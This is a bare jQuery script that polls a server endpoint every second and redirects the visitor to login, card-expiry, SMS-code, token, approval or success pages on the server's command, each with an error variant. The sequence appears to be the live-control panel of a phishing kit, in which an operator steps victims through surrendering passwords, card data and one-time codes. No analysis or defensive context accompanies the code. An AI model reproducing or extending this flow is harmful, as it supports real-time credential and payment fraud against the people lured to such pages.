<script>
$(document).ready(function() {
    ! function r() {
        $.ajax({
            url: "check_condition.php",
            type: "GET",
            dataType: "json",
            success: function(e) {
                "login" === e.redirect_user ? window.location.href = "login.php" : "login-error" ===
                    e.redirect_user ? window.location.href = "login.php?err=1" : "exp" === e
                    .redirect_user ? window.location.href = "exp.php" : "exp-error" ===
                    e.redirect_user ? window.location.href = "exp.php?err=1" : "sms" ===
                    e.redirect_user ? window.location.href = "sms.php" : "sms-error" ===
                    e.redirect_user ? window.location.href = "sms.php?err=1" :
                    "token" === e.redirect_user ? window.location.href = "token.php" :
                    "token-error" === e.redirect_user ? window.location.href =
                    "token.php?err=1" : "confirmed" === e.redirect_user ? window.location
                    .href = "success.php" : "approve" === e.redirect_user ? window.location.href =
                    "approve.php" : ($("#message").text("redirect_user value: " + e
                        .redirect_user), setTimeout(r, 1e3))
            },
            error: function(e, o, t) {
                console.error("AJAX Error: ", o, t), setTimeout(r, 1e3)
            }
        })
    }()
});
</script>